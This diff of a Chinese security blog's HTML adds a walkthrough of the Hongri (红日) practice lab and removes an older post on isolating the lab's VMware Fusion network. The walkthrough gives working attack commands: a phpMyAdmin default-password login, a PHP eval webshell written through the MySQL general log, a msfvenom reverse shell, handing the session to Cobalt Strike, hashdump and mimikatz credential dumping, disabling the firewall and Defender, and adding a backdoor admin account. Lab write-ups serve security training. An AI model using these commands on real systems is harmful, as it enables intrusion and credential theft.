@@ -200,6 +200,132 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/29/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="xiaoluan">
+      <meta itemprop="description" content="健康 规律 技能">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小乱的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/07/29/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/" class="post-title-link" itemprop="url">红日靶场一</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-07-29 21:37:13" itemprop="dateCreated datePublished" datetime="2022-07-29T21:37:13+08:00">2022-07-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-07-31 17:23:35" itemprop="dateModified" datetime="2022-07-31T17:23:35+08:00">2022-07-31</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/source/categories/1-%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">1.靶场练习</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/source/categories/1-%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/1-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">1.红日靶场</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>用dirsearch扫描发现主机有phpmyadmin</p>
+<p>访问该路径发现phpmyadmin登陆窗口，猜测默认口令：root&#x2F;root，登陆成功</p>
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207311506186.png" alt="image-20220731150611679"></p>
+<h3 id="开放3306远程连接"><a href="#开放3306远程连接" class="headerlink" title="开放3306远程连接"></a>开放3306远程连接</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 允许远程连接</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> PRIVILEGES <span class="keyword">ON</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">TO</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;root&#x27;</span> <span class="keyword">WITH</span> <span class="keyword">GRANT</span> OPTION;</span><br><span class="line"># 刷新权限</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>
+
+<p>用navicat、mysqld等工具远程连接3306端口</p>
+<h3 id="日志getshell"><a href="#日志getshell" class="headerlink" title="日志getshell"></a>日志getshell</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 开启mysql日志功能</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> &quot;ON&quot;;</span><br><span class="line"># 设置日志文件保存为C:<span class="operator">/</span>phpStudy<span class="operator">/</span>WWW<span class="operator">/</span>shelllog.php</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file <span class="operator">=</span> &quot;C:/phpStudy/WWW/shelllog.php&quot;;</span><br><span class="line"># 查看日志文件保存在哪里</span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;general%&#x27;</span>;</span><br><span class="line"># 写入一句话木马</span><br><span class="line"><span class="keyword">select</span> &quot;&lt;?=eval(@$_POST[&#x27;test&#x27;]);?&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这样设置，就将所有sql执行记录存放到了网站根目录下的shelllog.php文件，也包括我们的一句话木马。</p>
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207292150789.png" alt="image-20220729215026519"></p>
+<p>使用蚁剑连接一句话</p>
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207292202861.png" alt="image-20220729220234962"></p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>生成木马</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># lhost为公网IP地址</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.50.171 LPORT=4444 -f exe -o msf1.exe</span><br></pre></td></tr></table></figure>
+
+<p>msf开启监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 开msf控制台</span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line"># 使用利用模块</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"># 查看选项</span><br><span class="line">show options</span><br><span class="line"># 设置本地地址（公网地址，木马执行后外联的目的地址）</span><br><span class="line">set LHOST 192.168.50.171</span><br><span class="line"># 设置本地端口</span><br><span class="line">set lport 21003</span><br><span class="line"># 加载后渗透模块</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line"># 执行</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑关闭防火墙，上传msf1.exe，执行程序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 关闭防火墙</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
+
+<p>上传到任意有执行权限的目录</p>
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207311434070.png" alt="image-20220731143420134"></p>
+<p>执行木马</p>
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207311436753.png" alt="image-20220731143627847"></p>
+<p>监听成功</p>
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207311439469.png" alt="image-20220731143913864"></p>
+<h3 id="msf派生shell给cs"><a href="#msf派生shell给cs" class="headerlink" title="msf派生shell给cs"></a>msf派生shell给cs</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 获取system权限</span><br><span class="line">getsystem</span><br><span class="line"># 放置shell到后台</span><br><span class="line">background</span><br></pre></td></tr></table></figure>
+
+<p>利用相关模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">show options</span><br><span class="line"># 取消msf的监听，让lhost和lport只具备指引外联地址的作用，如果没有这条，msf的监听会和cs的监听冲突</span><br><span class="line">set DisablePayloadHandler true</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost &#x27;cs监听地址&#x27;</span><br><span class="line">set lport &#x27;cs监听端口&#x27;</span><br><span class="line">set session &#x27;msf放置到后台的session数字&#x27;</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>cs获得派生shell</p>
+<p>getsystem获得system权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 调低cs心跳，默认60，代表与靶机有60秒延迟</span><br><span class="line">sleep 1</span><br><span class="line"># 自动化获得system权限</span><br><span class="line">getsystem</span><br><span class="line"># 执行shell命令，查看当前权限</span><br><span class="line">shell whoami</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207311445465.png" alt="image-20220731144503538"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 抓靶机系统密码hash值</span><br><span class="line">hashdump</span><br><span class="line"># 调用mimikatz抓系统密码（低版本明文，高版本hash）</span><br><span class="line">logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207311459175.png" alt="image-20220731145945206"></p>
+<h3 id="开3389远程连接"><a href="#开3389远程连接" class="headerlink" title="开3389远程连接"></a>开3389远程连接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 开启3389端口</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
+
+<p>rdesktop远程连接</p>
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207311539557.png" alt="image-20220731153915366"></p>
+<h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"># 当前用户</span><br><span class="line">whoami</span><br><span class="line"># 主机名</span><br><span class="line">hostname</span><br><span class="line"># 本机用户列表</span><br><span class="line">net user</span><br><span class="line"># 本地管理员组</span><br><span class="line">net localgroup administrator</span><br><span class="line"># 系统版本</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br><span class="line"># 系统架构</span><br><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br><span class="line"># 安装软件及版本</span><br><span class="line">wmic product get name,version</span><br><span class="line"># 进程与服务</span><br><span class="line">tasklist</span><br><span class="line"># IP查询，根据DNS判断是否在域环境</span><br><span class="line">ipconfig/all</span><br><span class="line"># 局域网内其他主机名</span><br><span class="line">net view</span><br><span class="line"># 查看域用户</span><br><span class="line">net view /domain</span><br><span class="line"># 查询计算机名 全名 用户名 系统版本 工作站 域 登录域</span><br><span class="line">net config workstation</span><br><span class="line"># 查看域控服务器</span><br><span class="line">nslookup god.org</span><br><span class="line"># 查看当前域下的所有用户 </span><br><span class="line">net user /domain # 若发现能够执行，说明此台机器在域中 (若是此命令在显示域处显示 WORKGROUP，则不存在域，若是报错：发生系统错误 5，则存在域，但当前登录用户不是域用户)</span><br><span class="line"># 获取域内用户信息</span><br><span class="line">wmic useraccount get /all</span><br><span class="line"># 查看域管理员的名字</span><br><span class="line">net group &quot;domain admins&quot; /domain</span><br><span class="line"># 查看所有域成员计算机名</span><br><span class="line">net group &quot;domain computers&quot; /domain</span><br><span class="line"># 查看域管理员</span><br><span class="line">net group &quot;domain admins&quot; /domain</span><br></pre></td></tr></table></figure>
+
+<p>渗透过程中可能用到的dos命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">net user hack hack123 /add</span><br><span class="line">net localgroup administrator hack /add</span><br><span class="line">net localgroup &quot;Remote Desktop Users&quot; hack /add</span><br><span class="line">开启3389；</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line">netsh advfirewall set allprofiles state off        #关闭防火墙</span><br><span class="line">net stop windefend</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/28/MacOS-VMwareFusion%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -231,7 +357,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-07-29 21:20:24" itemprop="dateModified" datetime="2022-07-29T21:20:24+08:00">2022-07-29</time>
+                <time title="修改时间：2022-07-31 17:29:34" itemprop="dateModified" datetime="2022-07-31T17:29:34+08:00">2022-07-31</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -258,90 +384,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u010476994/article/details/104001848">https://blog.csdn.net/u010476994/article/details/104001848</a></p>
-<p><a target="_blank" rel="noopener" href="https://mo-onstudy.com/2022/01/13/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/">https://mo-onstudy.com/2022/01/13/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/</a></p>
-<h3 id="VMware-Fusion配置"><a href="#VMware-Fusion配置" class="headerlink" title="VMware Fusion配置"></a>VMware Fusion配置</h3><p>在mac命令行里，修改关于VMware Fusion网卡到配置文件，改打了注释的地方即可</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /Library/Preferences/VMware\ Fusion/networking</span><br></pre></td></tr></table></figure>
-
-<p>修改为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">VERSION=1,0</span><br><span class="line">answer VNET_1_DHCP no	//修改</span><br><span class="line">answer VNET_1_DHCP_CFG_HASH F7F79C241EC928D7CA1121B015C2AA4719D12591</span><br><span class="line">answer VNET_1_HOSTONLY_NETMASK 255.255.255.0	//修改</span><br><span class="line">answer VNET_1_HOSTONLY_SUBNET 192.168.52.0	//修改</span><br><span class="line">answer VNET_1_HOSTONLY_UUID FABDE6B9-8968-40BE-AC6B-9CB97CAD19E0</span><br><span class="line">answer VNET_1_VIRTUAL_ADAPTER yes</span><br><span class="line">answer VNET_8_DHCP no	//修改</span><br><span class="line">answer VNET_8_DHCP_CFG_HASH A8C956D502720409073060FB037B694D21771B89</span><br><span class="line">answer VNET_8_HOSTONLY_NETMASK 255.255.255.0	//修改</span><br><span class="line">answer VNET_8_HOSTONLY_SUBNET 192.168.11.0	//修改</span><br><span class="line">answer VNET_8_HOSTONLY_UUID E4426FB6-0333-4D3F-84AF-B4ED8B73D803</span><br><span class="line">answer VNET_8_NAT yes</span><br><span class="line">answer VNET_8_VIRTUAL_ADAPTER yes</span><br></pre></td></tr></table></figure>
-
-<p>修改vmnet8网关：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /Library/Preferences/VMware\ Fusion/vmnet8/nat.conf</span><br></pre></td></tr></table></figure>
-
-<p>修改为：（修改添加了注释的地方即可）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># VMware NAT configuration file</span><br><span class="line"># Manual editing of this file is not recommended. Using UI is preferred.</span><br><span class="line"></span><br><span class="line">[host]</span><br><span class="line"></span><br><span class="line"># Use MacOS network virtualization API</span><br><span class="line">useMacosVmnetVirtApi = 1</span><br><span class="line"></span><br><span class="line"># NAT gateway address</span><br><span class="line">ip = 192.168.11.2	//修改为网关地址</span><br><span class="line">netmask = 255.255.255.0	//修改为网关地址</span><br><span class="line"></span><br><span class="line"># Last DHCP address</span><br><span class="line">lastDhcpAddress = 192.168.11.127</span><br><span class="line"></span><br><span class="line"># VMnet device if not specified on command line</span><br><span class="line">device = vmnet8</span><br><span class="line"></span><br><span class="line"># Allow PORT/EPRT FTP commands (they need incoming TCP stream ...)</span><br><span class="line">activeFTP = 1</span><br><span class="line"></span><br><span class="line"># Allows the source to have any OUI.  Turn this on if you change the OUI</span><br><span class="line"># in the MAC address of your virtual machines</span><br></pre></td></tr></table></figure>
-
-<p>修改vmnet1网关</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /Library/Preferences/VMware\ Fusion/vmnet1/nat.conf</span><br></pre></td></tr></table></figure>
-
-<p>修改为：（修改添加了注释的地方即可）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># VMware NAT configuration file</span><br><span class="line"># Manual editing of this file is not recommended. Using UI is preferred.</span><br><span class="line"></span><br><span class="line">[host]</span><br><span class="line"></span><br><span class="line"># Use MacOS network virtualization API</span><br><span class="line">useMacosVmnetVirtApi = 1</span><br><span class="line"></span><br><span class="line"># NAT gateway address</span><br><span class="line">ip = 192.168.52.2	//修改为网关地址</span><br><span class="line">netmask = 255.255.255.0	//修改为网关地址</span><br><span class="line"></span><br><span class="line"># Last DHCP address</span><br><span class="line">lastDhcpAddress = 192.168.52.127</span><br><span class="line"></span><br><span class="line"># VMnet device if not specified on command line</span><br><span class="line">device = vmnet1</span><br><span class="line"></span><br><span class="line"># Allow PORT/EPRT FTP commands (they need incoming TCP stream ...)</span><br><span class="line">activeFTP = 1</span><br><span class="line"></span><br><span class="line"># Allows the source to have any OUI.  Turn this on if you change the OUI</span><br><span class="line"># in the MAC address of your virtual machines</span><br></pre></td></tr></table></figure>
-
-<p>如上修改后，VMware Fusion的NAT模式默认网段就变成了192.168.11.0&#x2F;24，仅主机模式默认网段就变成了192.168.52.0&#x2F;24</p>
-<h3 id="靶机配置"><a href="#靶机配置" class="headerlink" title="靶机配置"></a>靶机配置</h3><p>给虚拟机新建一张网卡</p>
-<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207281538264.png" alt="image-20220728153844985"></p>
-<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207281540408.png" alt="image-20220728154009085"></p>
-<p>然后将新建的网卡配置为nat模式，设置地址为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.11.123</span><br><span class="line">255.255.255.0</span><br><span class="line">192.168.11.2</span><br></pre></td></tr></table></figure>
-
-<p>检查原本存在的网卡，该网卡为仅主机模式，地址应该为：（不用修改，红日靶场给内网都配了固定的IP）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.52.xxx</span><br><span class="line">255.255.255.0</span><br><span class="line">192.168.52.2</span><br></pre></td></tr></table></figure>
-
-<p>这样win7作为内外网边界的一个角色，就搭建好了，192.168.11.123对外服务，192.168.52.xxx对内通信，内外网隔离。</p>
-<p>配置内网两台主机：</p>
-<p>win server 2003</p>
-<p>配置为仅主机模式</p>
-<p>win server 2008</p>
-<p>配置为仅主机模式</p>
-<h3 id="解决mac与内网仍然互通问题"><a href="#解决mac与内网仍然互通问题" class="headerlink" title="解决mac与内网仍然互通问题"></a>解决mac与内网仍然互通问题</h3><p>预期拓扑结构</p>
-<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207281546226.png"></p>
-<p>按以上步骤搭建完成后，测试网络环境发现。</p>
-<p>mac可以联通边界地址192.168.11.123，也就是win7的NAT网卡，这是正常的，我们需要通过这个地址对外提供web服务。（由于win7开了防火墙，ping192.168.11.123是不通的，但是打开phpstudy之后，访问web服务应该是正常的）</p>
-<p>mac可以ping通192.168.52.xxx，这是不正常的，因为mac作为物理攻击机，应当只能访问门户，而不能接触到作为内网的192.168.52.xxx网段。</p>
-<p>经过思考和查询资料，小乱发现，可以通过以下方法将内网与mac物理机隔离开来。</p>
-<p><strong>外网环境</strong></p>
-<p>win7的NAT网卡配置不变，地址依旧为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.11.123</span><br><span class="line">255.255.255.0</span><br><span class="line">192.168.11.2</span><br></pre></td></tr></table></figure>
-
-<p><strong>内网环境</strong></p>
-<p>新增一个虚拟网络：</p>
-<p>VMware Fusion–偏好设置–网络</p>
-<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207291716209.png" alt="image-20220729171656926"></p>
-<p>把新网卡的子网地址设置为192.168.52.0&#x2F;24（如果与vmnet1地址冲突，别忘了把vmnet1的子网地址改成其他的）</p>
-<p>配置虚拟网络</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /Library/Preferences/VMware\ Fusion/networking</span><br></pre></td></tr></table></figure>
-
-<p>打开后会发现里面多了一些vmnet2的配置，这是自动配好的，把dhcp设置改为no，vmnet1改成其他不冲突的地址即可</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">VERSION=1,0</span><br><span class="line">answer VNET_1_DHCP no</span><br><span class="line">answer VNET_1_DHCP_CFG_HASH F7F79C241EC928D7CA1121B015C2AA4719D12591</span><br><span class="line">answer VNET_1_HOSTONLY_NETMASK 255.255.255.0</span><br><span class="line">answer VNET_1_HOSTONLY_SUBNET 192.168.222.0	//修改</span><br><span class="line">answer VNET_1_HOSTONLY_UUID FABDE6B9-8968-40BE-AC6B-9CB97CAD19E0</span><br><span class="line">answer VNET_1_VIRTUAL_ADAPTER yes</span><br><span class="line">answer VNET_2_DHCP no	//修改</span><br><span class="line">answer VNET_2_HOSTONLY_NETMASK 255.255.255.0</span><br><span class="line">answer VNET_2_HOSTONLY_SUBNET 192.168.52.0</span><br><span class="line">answer VNET_2_VIRTUAL_ADAPTER yes</span><br><span class="line">answer VNET_8_DHCP no</span><br><span class="line">answer VNET_8_DHCP_CFG_HASH A8C956D502720409073060FB037B694D21771B89</span><br><span class="line">answer VNET_8_HOSTONLY_NETMASK 255.255.255.0</span><br><span class="line">answer VNET_8_HOSTONLY_SUBNET 192.168.11.0</span><br><span class="line">answer VNET_8_HOSTONLY_UUID E4426FB6-0333-4D3F-84AF-B4ED8B73D803</span><br><span class="line">answer VNET_8_NAT yes</span><br><span class="line">answer VNET_8_VIRTUAL_ADAPTER yes</span><br></pre></td></tr></table></figure>
-
-<p>配置网关</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /Library/Preferences/VMware\ Fusion/vmnet2/nat.conf</span><br></pre></td></tr></table></figure>
-
-<p>配置为192.168.52.2，如果vmnet2下没有nat.conf文件，从vmnet8下复制过来修改即可</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># VMware NAT configuration file</span><br><span class="line"># Manual editing of this file is not recommended. Using UI is preferred.</span><br><span class="line"></span><br><span class="line">[host]</span><br><span class="line"></span><br><span class="line"># Use MacOS network virtualization API</span><br><span class="line">useMacosVmnetVirtApi = 1</span><br><span class="line"></span><br><span class="line"># NAT gateway address</span><br><span class="line">ip = 192.168.52.2	//修改为网关地址</span><br><span class="line">netmask = 255.255.255.0	//修改为网关地址</span><br><span class="line"></span><br><span class="line"># Last DHCP address</span><br><span class="line">lastDhcpAddress = 192.168.52.127</span><br><span class="line"></span><br><span class="line"># VMnet device if not specified on command line</span><br><span class="line">device = vmnet1</span><br><span class="line"></span><br><span class="line"># Allow PORT/EPRT FTP commands (they need incoming TCP stream ...)</span><br><span class="line">activeFTP = 1</span><br><span class="line"></span><br><span class="line"># Allows the source to have any OUI.  Turn this on if you change the OUI</span><br><span class="line"># in the MAC address of your virtual machines</span><br></pre></td></tr></table></figure>
-
-<p>然后把所有内网网卡绑定到这个虚拟网络</p>
-<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207281601483.png"></p>
-<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207281603566.png"></p>
-<p>测试联通性，发现mac物理机，仍然可以ping通192.168.52.0网段，这是因为新建的vmnet2虚拟网络中，mac是默认存在于这个网络中的，即192.168.52.1</p>
-<p>mac命令行使用ifconfig查看当前网络情况，可以发现一张网卡拥有192.168.52.1这个网络地址</p>
-<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207291730669.png" alt="image-20220729173032667"></p>
-<p>禁用这张网卡即可</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ifconfig bridge101 down</span><br></pre></td></tr></table></figure>
-
-<p>然后再尝试用mac去ping192.168.52.0网段，发现已经ping不通了。</p>
-<p>但这个办法每次重启VMware之后都要重新禁用一下网卡，如果有师傅知道更好的办法，也可以发个博客分享一下。</p>
